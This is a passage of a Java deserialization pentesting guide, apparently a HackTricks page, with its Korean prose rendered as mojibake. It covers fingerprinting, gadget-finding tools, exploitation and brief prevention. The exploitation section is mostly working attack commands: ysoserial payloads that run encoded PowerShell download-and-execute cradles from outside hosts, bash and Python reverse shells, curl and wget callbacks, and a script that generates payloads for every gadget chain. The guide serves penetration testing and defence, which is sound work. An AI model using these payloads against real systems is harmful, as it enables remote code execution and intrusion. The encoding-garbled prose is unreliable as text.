* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Javaì—ì„œëŠ” **ì—­ì§ë ¬í™” ì½œë°±ì´ ì—­ì§ë ¬í™” ê³¼ì • ì¤‘ì— ì‹¤í–‰**ë©ë‹ˆë‹¤. ì´ ì‹¤í–‰ì€ ì•…ì˜ì ì¸ í˜ì´ë¡œë“œë¥¼ ì¡°ì‘í•˜ì—¬ ì´ëŸ¬í•œ ì½œë°±ì„ íŠ¸ë¦¬ê±°í•˜ëŠ” ì•…ìš©ìì— ì˜í•´ ì•…ì˜ì ì¸ ì‘ì—…ì˜ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Fingerprints

#### White Box

ì½”ë“œë² ì´ìŠ¤ì—ì„œ ì ì¬ì ì¸ ì§ë ¬í™” ì·¨ì•½ì ì„ ì‹ë³„í•˜ë ¤ë©´ ë‹¤ìŒì„ ê²€ìƒ‰í•˜ì‹­ì‹œì˜¤:

* `Serializable` ì¸í„°í˜ì´ìŠ¤ë¥¼ êµ¬í˜„í•˜ëŠ” í´ë˜ìŠ¤.
* `java.io.ObjectInputStream`, `readObject`, `readUnshare` í•¨ìˆ˜ì˜ ì‚¬ìš©.

íŠ¹íˆ ì£¼ì˜ë¥¼ ê¸°ìš¸ì—¬ì•¼ í•  ì‚¬í•­:

* ì™¸ë¶€ ì‚¬ìš©ìê°€ ì •ì˜í•œ ë§¤ê°œë³€ìˆ˜ë¡œ ì‚¬ìš©ëœ `XMLDecoder`.
* íŠ¹íˆ XStream ë²„ì „ì´ 1.46 ì´í•˜ì¸ ê²½ìš° `XStream`ì˜ `fromXML` ë©”ì„œë“œëŠ” ì§ë ¬í™” ë¬¸ì œì— ì·¨ì•½í•©ë‹ˆë‹¤.
* `ObjectInputStream`ì´ `readObject` ë©”ì„œë“œì™€ ê²°í•©ëœ ê²½ìš°.
* `readObject`, `readObjectNodData`, `readResolve`, ë˜ëŠ” `readExternal`ê³¼ ê°™ì€ ë©”ì„œë“œì˜ êµ¬í˜„.
* `ObjectInputStream.readUnshared`.
* `Serializable`ì˜ ì¼ë°˜ì ì¸ ì‚¬ìš©.

#### Black Box

ë¸”ë™ ë°•ìŠ¤ í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•´ íŠ¹ì • **ì„œëª… ë˜ëŠ” "ë§¤ì§ ë°”ì´íŠ¸"**ë¥¼ ì°¾ì•„ë³´ì‹­ì‹œì˜¤. ì´ëŠ” ìë°” ì§ë ¬í™”ëœ ê°ì²´ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤ (`ObjectInputStream`ì—ì„œ ìœ ë˜):

* 16ì§„ìˆ˜ íŒ¨í„´: `AC ED 00 05`.
* Base64 íŒ¨í„´: `rO0`.
* `Content-type`ì´ `application/x-java-serialized-object`ë¡œ ì„¤ì •ëœ HTTP ì‘ë‹µ í—¤ë”.
* ì••ì¶• ì „ 16ì§„ìˆ˜ íŒ¨í„´: `1F 8B 08 00`.
* ì••ì¶• ì „ Base64 íŒ¨í„´: `H4sIA`.
* `.faces` í™•ì¥ìì™€ `faces.ViewState` ë§¤ê°œë³€ìˆ˜ê°€ ìˆëŠ” ì›¹ íŒŒì¼. ì›¹ ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ ì´ëŸ¬í•œ íŒ¨í„´ì„ ë°œê²¬í•˜ë©´ [Java JSF ViewState Deserializationì— ëŒ€í•œ ê²Œì‹œë¬¼](java-jsf-viewstate-.faces-deserialization.md)ì— ìì„¸íˆ ê¸°ìˆ ëœ ì¡°ì‚¬ë¥¼ ìœ ë„í•´ì•¼ í•©ë‹ˆë‹¤.
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### ì·¨ì•½ ì—¬ë¶€ í™•ì¸

ë§Œì•½ **Java ì—­ì§ë ¬í™” exploitì´ ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ ë°°ìš°ê³  ì‹¶ë‹¤ë©´**, [**ê¸°ë³¸ Java ì—­ì§ë ¬í™”**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS ì—­ì§ë ¬í™”**](java-dns-deserialization-and-gadgetprobe.md), ê·¸ë¦¬ê³  [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md)ë¥¼ ì‚´í´ë³´ì„¸ìš”.

#### í™”ì´íŠ¸ë°•ìŠ¤ í…ŒìŠ¤íŠ¸

ì•Œë ¤ì§„ ì·¨ì•½ì ì´ ìˆëŠ” ì–´í”Œë¦¬ì¼€ì´ì…˜ì´ ì„¤ì¹˜ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
ë‹¹ì‹ ì€ ì•Œë ¤ì§„ ì·¨ì•½ì ì´ ìˆëŠ” **ëª¨ë“  ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ í™•ì¸**í•˜ê³  [**Ysoserial**](https://github.com/frohoff/ysoserial)ì´ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì„ ì œê³µí•˜ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜ëŠ” [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)ì—ì„œ ì§€ì •ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ í™•ì¸í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.\
ê°€ëŠ¥í•œ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ê°€ì ¯ ì²´ì¸ì„ ê²€ìƒ‰í•˜ê¸° ìœ„í•´ [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector)ë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.\
**gadgetinspector**ë¥¼ ì‹¤í–‰í•  ë•Œ (ë¹Œë“œ í›„) ê²½ê³ /ì˜¤ë¥˜ ë©”ì‹œì§€ê°€ í‘œì‹œë˜ë”ë¼ë„ ì‹ ê²½ ì“°ì§€ ë§ˆì‹œê³  ì™„ë£Œë  ë•Œê¹Œì§€ ê¸°ë‹¤ë¦¬ì‹­ì‹œì˜¤. ë°œê²¬ëœ ëª¨ë“  ë‚´ìš©ì€ _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ì— ê¸°ë¡ë©ë‹ˆë‹¤. **gadgetinspectorëŠ” ì•…ìš© ì½”ë“œë¥¼ ìƒì„±í•˜ì§€ ì•Šìœ¼ë©° ì˜ëª»ëœ ì–‘ì„± ê²°ê³¼ë¥¼ ë‚˜íƒ€ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

#### ë¸”ë™ë°•ìŠ¤ í…ŒìŠ¤íŠ¸

Burp í™•ì¥ í”„ë¡œê·¸ë¨ [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md)ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì‚¬ìš© ê°€ëŠ¥í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬(ë²„ì „ í¬í•¨)**ë¥¼ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ë¥¼ í†µí•´ ì·¨ì•½ì ì„ ì•…ìš©í•  payloadë¥¼ ì„ íƒí•˜ëŠ” ê²ƒì´ **ë” ì‰¬ì›Œì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
[GadgetProbeì— ëŒ€í•´ ë” ì•Œì•„ë³´ë ¤ë©´ ì´ ë¬¸ì„œë¥¼ ì½ì–´ë³´ì„¸ìš”](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbeëŠ” **`ObjectInputStream` ì—­ì§ë ¬í™”**ì— ì¤‘ì ì„ ë‘¡ë‹ˆë‹¤.

Burp í™•ì¥ í”„ë¡œê·¸ë¨ [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)ë¥¼ ì‚¬ìš©í•˜ì—¬ ysoserialë¡œ ì•…ìš© ê°€ëŠ¥í•œ **ì·¨ì•½í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‹ë³„**í•˜ê³  **ì•…ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
[Java Deserialization Scannerì— ëŒ€í•´ ë” ì•Œì•„ë³´ë ¤ë©´ ì´ ë¬¸ì„œë¥¼ ì½ì–´ë³´ì„¸ìš”](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization ScannerëŠ” **`ObjectInputStream`** ì—­ì§ë ¬í™”ì— ì¤‘ì ì„ ë‘¡ë‹ˆë‹¤.

[Freddy](https://github.com/nccgroup/freddy)ë¥¼ ì‚¬ìš©í•˜ì—¬ **Burp**ì—ì„œ **ì—­ì§ë ¬í™” ì·¨ì•½ì **ì„ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í”ŒëŸ¬ê·¸ì¸ì€ **`ObjectInputStream`** ê´€ë ¨ ì·¨ì•½ì  ë¿ë§Œ ì•„ë‹ˆë¼ **Json** ë° **Yml** ì—­ì§ë ¬í™” ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ì·¨ì•½ì ë„ ê°ì§€í•©ë‹ˆë‹¤. í™œì„± ëª¨ë“œì—ì„œëŠ” sleep ë˜ëŠ” DNS í˜ì´ë¡œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ í™•ì¸ì„ ì‹œë„í•©ë‹ˆë‹¤.\
[Freddyì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ì—¬ê¸°ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**ì§ë ¬í™” í…ŒìŠ¤íŠ¸**

ì„œë²„ì—ì„œ ì‚¬ìš© ì¤‘ì¸ ì·¨ì•½í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ í™•ì¸í•˜ëŠ” ê²ƒë§Œí¼ ì¤‘ìš”í•œ ê²ƒì€ ì•„ë‹™ë‹ˆë‹¤. ë•Œë¡œëŠ” ì§ë ¬í™”ëœ ê°ì²´ ë‚´ë¶€ì˜ ë°ì´í„°ë¥¼ ë³€ê²½í•˜ê³  ì¼ë¶€ í™•ì¸ì„ ìš°íšŒí•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤(ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ë‚´ì—ì„œ ê´€ë¦¬ì ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ë„ ìˆìŒ).\
ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ìœ¼ë¡œ ì „ì†¡ë˜ëŠ” Java ì§ë ¬í™”ëœ ê°ì²´ë¥¼ ë°œê²¬í•˜ë©´ [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì „ì†¡ëœ ì§ë ¬í™” ê°ì²´ë¥¼ ë” ì½ê¸° ì‰¬ìš´ í˜•ì‹ìœ¼ë¡œ ì¶œë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë³´ë‚´ëŠ” ë°ì´í„°ë¥¼ ì•Œë©´ ìˆ˜ì •í•˜ì—¬ ì¼ë¶€ í™•ì¸ì„ ìš°íšŒí•˜ëŠ” ê²ƒì´ ë” ì‰¬ì›Œì§‘ë‹ˆë‹¤.

### **ì•…ìš©**

#### **ysoserial**

Java ì—­ì§ë ¬í™”ë¥¼ ì•…ìš©í•˜ëŠ” ì£¼ìš” ë„êµ¬ëŠ” [**ysoserial**](https://github.com/frohoff/ysoserial)ì…ë‹ˆë‹¤ ([**ì—¬ê¸°ì—ì„œ ë‹¤ìš´ë¡œë“œ**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). ë³µì¡í•œ ëª…ë ¹(ì˜ˆ: íŒŒì´í”„ ì‚¬ìš©)ì„ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified)ë„ ê³ ë ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ ë„êµ¬ëŠ” **`ObjectInputStream`**ì„ ì•…ìš©í•˜ëŠ” ë° ì¤‘ì ì„ ë‘ê³  ìˆìŠµë‹ˆë‹¤.\
ì£¼ì…ì´ ê°€ëŠ¥í•œì§€ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ **RCE** í˜ì´ë¡œë“œë³´ë‹¤ **"URLDNS"** í˜ì´ë¡œë“œë¥¼ ë¨¼ì € ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. ê·¸ë˜ë„ "URLDNS" í˜ì´ë¡œë“œê°€ ì‘ë™í•˜ì§€ ì•Šì„ ìˆ˜ ìˆì§€ë§Œ ë‹¤ë¥¸ RCE í˜ì´ë¡œë“œëŠ” ì‘ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
**java.lang.Runtime.exec()**ì— ëŒ€í•œ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•  ë•ŒëŠ” ">" ë˜ëŠ” "|"ì™€ ê°™ì€ íŠ¹ìˆ˜ ë¬¸ìë¥¼ ì‚¬ìš©í•  ìˆ˜ ì—†ìœ¼ë©°, "$()"ë¥¼ ì‚¬ìš©í•˜ì—¬ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê±°ë‚˜ ëª…ë ¹ì— **ê³µë°±**ìœ¼ë¡œ êµ¬ë¶„ëœ **ì¸ìˆ˜ë¥¼ ì „ë‹¬**í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤ (`echo -n "hello world"`ëŠ” ê°€ëŠ¥í•˜ì§€ë§Œ `python2 -c 'print "Hello world"'`ëŠ” ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤). í˜ì´ë¡œë“œë¥¼ ì˜¬ë°”ë¥´ê²Œ ì¸ì½”ë”©í•˜ë ¤ë©´ [ì´ ì›¹í˜ì´ì§€](http://www.jackson-t.ca/runtime-exec-payloads.html)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì·¨ì•½í•œ ì›¹ í˜ì´ì§€ì—ì„œ **Windows ë° Linuxì— ëŒ€í•œ ëª¨ë“  ê°€ëŠ¥í•œ ì½”ë“œ ì‹¤í–‰** í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ê³  í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ììœ ë¡­ê²Œ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### ì‹œë¦¬ì–¼í‚¬ëŸ¬ë°”ì´íŒ¨ìŠ¤ê°€ì ¯

[**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection)ì„ **ì‚¬ìš©í•˜ì—¬** ysoserialê³¼ í•¨ê»˜ ë” ë§ì€ ìµìŠ¤í”Œë¡œì‡ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë„êµ¬ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë„êµ¬ê°€ ì†Œê°œëœ **ë°œí‘œ ìë£Œ**ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec)ì€ Javaì—ì„œ ë‹¤ì–‘í•œ **Json** ë° **Yml** ì§ë ¬í™” ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•œ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
í”„ë¡œì íŠ¸ë¥¼ ì»´íŒŒì¼í•˜ë ¤ë©´ `pom.xml`ì— ë‹¤ìŒ **ì˜ì¡´ì„±**ì„ **ì¶”ê°€**í•´ì•¼ í–ˆìŠµë‹ˆë‹¤:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Mavenì„ ì„¤ì¹˜**í•˜ê³  í”„ë¡œì íŠ¸ë¥¼ **ì»´íŒŒì¼**í•˜ì„¸ìš”:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

ì´ Java JSON ë¼ì´ë¸ŒëŸ¬ë¦¬ì— ëŒ€í•´ ë” ì½ì–´ë³´ì„¸ìš”: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* ì¼ë¶€ ysoserial í˜ì´ë¡œë“œë¥¼ í…ŒìŠ¤íŠ¸í•˜ë ¤ë©´ **ì´ ì›¹ì•±ì„ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

JavaëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë‹¤ì–‘í•œ ëª©ì ìœ¼ë¡œ ì§ë ¬í™”ë¥¼ ë§ì´ ì‚¬ìš©í•©ë‹ˆë‹¤:

* **HTTP ìš”ì²­**: ì§ë ¬í™”ëŠ” ë§¤ê°œë³€ìˆ˜, ViewState, ì¿ í‚¤ ê´€ë¦¬ ë“±ì—ì„œ ë„ë¦¬ ì‚¬ìš©ë©ë‹ˆë‹¤.
* **RMI (ì›ê²© ë©”ì„œë“œ í˜¸ì¶œ)**: ì§ë ¬í™”ì— ì™„ì „íˆ ì˜ì¡´í•˜ëŠ” Java RMI í”„ë¡œí† ì½œì€ Java ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì›ê²© í†µì‹ ì˜ ì¤‘ì¶” ì—­í• ì„ í•©ë‹ˆë‹¤.
* **HTTPë¥¼ í†µí•œ RMI**: ì´ ë°©ë²•ì€ Java ê¸°ë°˜ì˜ ë‘êº¼ìš´ í´ë¼ì´ì–¸íŠ¸ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë˜ë©° ëª¨ë“  ê°ì²´ í†µì‹ ì— ëŒ€í•´ ì§ë ¬í™”ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
* **JMX (Java ê´€ë¦¬ í™•ì¥)**: JMXëŠ” ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•´ ê°ì²´ë¥¼ ì „ì†¡í•˜ê¸° ìœ„í•´ ì§ë ¬í™”ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
* **ì‚¬ìš©ì ì •ì˜ í”„ë¡œí† ì½œ**: Javaì—ì„œëŠ” ì›ì‹œ Java ê°ì²´ì˜ ì „ì†¡ì´ ì¼ë°˜ì ì´ë©° ì´ëŠ” ë‹¤ê°€ì˜¤ëŠ” ì•…ìš© ì˜ˆì œì—ì„œ ì„¤ëª…ë  ê²ƒì…ë‹ˆë‹¤.

### Prevention

#### ì¼ì‹œì  ê°ì²´

`Serializable`ì„ êµ¬í˜„í•˜ëŠ” í´ë˜ìŠ¤ëŠ” ì§ë ¬í™”ë˜ì§€ ë§ì•„ì•¼ í•˜ëŠ” í´ë˜ìŠ¤ ë‚´ì˜ ëª¨ë“  ê°ì²´ë¥¼ `transient`ë¡œ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### `Serializable`ë¥¼ êµ¬í˜„í•´ì•¼ í•˜ëŠ” í´ë˜ìŠ¤ì˜ ì§ë ¬í™” ë°©ì§€

íŠ¹ì • **ê°ì²´ê°€ í´ë˜ìŠ¤ ê³„ì¸µ êµ¬ì¡°ë¡œ ì¸í•´ `Serializable` ì¸í„°í˜ì´ìŠ¤ë¥¼ êµ¬í˜„í•´ì•¼ í•˜ëŠ”** ìƒí™©ì—ì„œëŠ”, ì˜ë„í•˜ì§€ ì•Šì€ ì—­ì§ë ¬í™”ì˜ ìœ„í—˜ì´ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ ì•„ë˜ì™€ ê°™ì´ í•­ìƒ ì˜ˆì™¸ë¥¼ throwí•˜ëŠ” `final` `readObject()` ë©”ì„œë“œë¥¼ ì •ì˜í•˜ì—¬ ì´ëŸ¬í•œ ê°ì²´ê°€ ì—­ì§ë ¬í™”ë˜ì§€ ì•Šë„ë¡ í•´ì•¼ í•©ë‹ˆë‹¤:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Javaì—ì„œ ì—­ì§ë ¬í™” ë³´ì•ˆ ê°•í™”**

**`java.io.ObjectInputStream`ì„ ì‚¬ìš©ì ì •ì˜**í•˜ëŠ” ê²ƒì€ ì—­ì§ë ¬í™” í”„ë¡œì„¸ìŠ¤ë¥¼ ë³´í˜¸í•˜ëŠ” ì‹¤ìš©ì ì¸ ë°©ë²•ì…ë‹ˆë‹¤. ì´ ë°©ë²•ì€ ë‹¤ìŒ ê²½ìš°ì— ì í•©í•©ë‹ˆë‹¤:

* ì—­ì§ë ¬í™” ì½”ë“œê°€ ë‹¹ì‹ ì˜ í†µì œ ì•„ë˜ì— ìˆëŠ” ê²½ìš°.
* ì—­ì§ë ¬í™”ë¥¼ ìœ„í•´ ì˜ˆìƒë˜ëŠ” í´ë˜ìŠ¤ê°€ ì•Œë ¤ì§„ ê²½ìš°.

